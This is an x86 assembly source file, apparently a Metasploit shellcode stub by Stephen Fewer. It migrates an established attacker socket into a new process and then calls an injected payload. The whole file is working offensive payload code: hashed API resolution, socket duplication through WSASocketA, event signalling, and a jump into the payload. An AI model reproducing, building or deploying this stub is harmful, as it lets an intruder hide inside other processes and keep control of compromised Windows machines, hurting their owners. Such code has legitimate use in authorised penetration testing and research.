;-----------------------------------------------------------------------------;
; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4
; Architecture: x86
; Version: 1.0 (Jan 2010)
; Size: 219 bytes
; Build: >build.py migrate
;-----------------------------------------------------------------------------;

; typedef struct MigrateContext
; {
; 	union
; 	{
; 		HANDLE hEvent;
; 		BYTE bPadding1[8];
; 	} e;
; 	union
; 	{
; 		LPVOID lpPayload;
; 		BYTE bPadding2[8];
; 	} p;
; 	WSAPROTOCOL_INFO info;
; } MIGRATECONTEXT, * LPMIGRATECONTEXT;

[BITS 32]
[ORG 0]

  cld                    ; Clear the direction flag.
  mov esi, [esp+4]       ; ESI is a pointer to our migration stub context
  sub esp, 0x2000        ; Alloc some space on stack
  call start             ; Call start, this pushes the address of 'api_call' onto the stack.
delta:                   ;
%include "./src/block/block_api.asm" ;
start:                   ;
  pop ebp                ; Pop off the address of 'api_call' for calling later.
  
  push 0x00003233        ; Push the bytes 'ws2_32',0,0 onto the stack.
  push 0x5F327377        ; ...
  push esp               ; Push a pointer to the "ws2_32" string on the stack.
  push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
  call ebp               ; LoadLibraryA( "ws2_32" )
  
  mov eax, 0x0190        ; EAX = sizeof( struct WSAData )
  sub esp, eax           ; alloc some space for the WSAData structure
  push esp               ; push a pointer to this stuct
  push eax               ; push the wVersionRequested parameter
  push 0x006B8029        ; hash( "ws2_32.dll", "WSAStartup" )
  call ebp               ; WSAStartup( 0x0190, &WSAData );
  
  push eax               ; If we succeed, eax wil be zero, push zero for the flags param.
  push eax               ; Push null for reserved parameter
  lea ebx, [esi+16]      ; 
  push ebx               ; We specify the WSAPROTOCOL_INFO structure from the MigrateContext
  push eax               ; We do not specify a protocol
  inc eax                ;
  push eax               ; Push SOCK_STREAM
  inc eax                ;
  push eax               ; Push AF_INET
  push 0xE0DF0FEA        ; hash( "ws2_32.dll", "WSASocketA" )
  call ebp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, &info, 0, 0 );
  xchg edi, eax          ; Save the socket for later, we don't care about the value of eax after this
  
  push dword [esi]       ; Push the event
  push 0x35269F1D        ; hash( "kernel32.dll", "SetEvent" )
  call ebp               ; SetEvent( hEvent );
  
  call dword [esi+8]     ; Call the payload...
